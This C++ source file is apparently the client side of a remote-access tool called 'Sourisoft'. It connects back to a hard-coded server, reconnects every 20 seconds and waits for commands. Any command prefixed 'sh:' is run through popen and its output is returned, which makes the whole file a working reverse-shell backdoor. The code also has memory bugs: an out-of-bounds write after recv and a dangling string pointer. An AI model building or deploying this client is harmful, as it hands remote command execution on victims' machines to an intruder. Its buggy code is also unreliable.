/**
*     Sourisoft's client
*
*     @author Kevin Hascoët
*
      gcc client.cpp -o client -Wall
*
*/
	
#include "client.hpp"

using namespace std;

int main(int argc, char const *argv[])
{

    // if we're on windows
    #if defined (WIN32)
        WSADATA WSAData;
        WSAStartup(MAKEWORD(2,2), &WSAData);
    #endif


	int sock,val;
	char buffer[BUFSIZE];
	struct sockaddr_in server_address;
	bool isConnected = true;
	while(true)
	{
	// Create the socket 
	if((sock= socket(AF_INET,SOCK_STREAM,0))== -1)
	{
		perror("socket");
		exit (EXIT_FAILURE);
	}

	// configuration of the connection
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(PORT);
	server_address.sin_addr.s_addr= inet_addr(IP);
	
		cout<<"Try to connect..."<<endl;
		// Try to connect 
		while(connect(sock, (struct sockaddr*)&server_address,sizeof(server_address)) == -1)
		{
			perror("connect");
			// if we're on windows
			#if defined (WIN32)
				Sleep(20000);
			// else, if we're on Linux
			#elif defined (linux)
				sleep(20);
			#endif
		}
		cout<<"Connecté au serveur !"<<endl;
		isConnected=true;
	    while(isConnected)
	    {
	    	#if defined (WIN32)
				Sleep(500);
			// else, if we're on Linux
			#elif defined (linux)
				usleep(500000);
			#endif
	    	if((val=recv(sock,buffer,BUFSIZE,0))<0)
	        {
	        	cout<<"RIEN RECU"<<endl;
	            perror("recv");
	        }
	        buffer[val]='\0';
	        cout<<"recu :"<<buffer<<endl;
	        if(val>0)
	        {
	        	string buf(buffer);
		       	string rep(getResponse(buf,sock));
		       	int size = rep.size();
		        if(send(sock,rep.c_str(),size,0)!=size)
		        {
		        	perror("send");
		        }

		   	}else if(val<=0)
	    	{
	    		close(sock);
	    		isConnected=false;
	    	}
	    }
	}
	return 0;
}

string getResponse(string buffer,int sock)
{
	string delimiter = ":";
	string prefix = buffer.substr(0,buffer.find(delimiter));
	char* command = (char*)(buffer.substr(buffer.find(delimiter)+1	,buffer.size()-1)).c_str();
	string mystring;
	if(prefix=="sh")
	{	 	
		FILE* myfile ;
        my_popen(command,mystring);
		if(mystring.size()==0)
		{
			mystring= "Commande non verbeuse";
		}    
	    return mystring;
            
	}
	return "error";

}
bool my_popen (const std::string& cmd,std::string& out ) {
    bool            ret_boolValue = true;
    FILE*           fp;
    const int       SIZEBUF = 1234;
    char            buf [SIZEBUF];
    
    if ((fp = popen(cmd.c_str (), "r")) == NULL) {
        return false;
    }
    std::string  cur_string = "";
    while (fgets(buf, sizeof (buf), fp)) {
        out += buf;
    }
    pclose(fp);
    return true;
}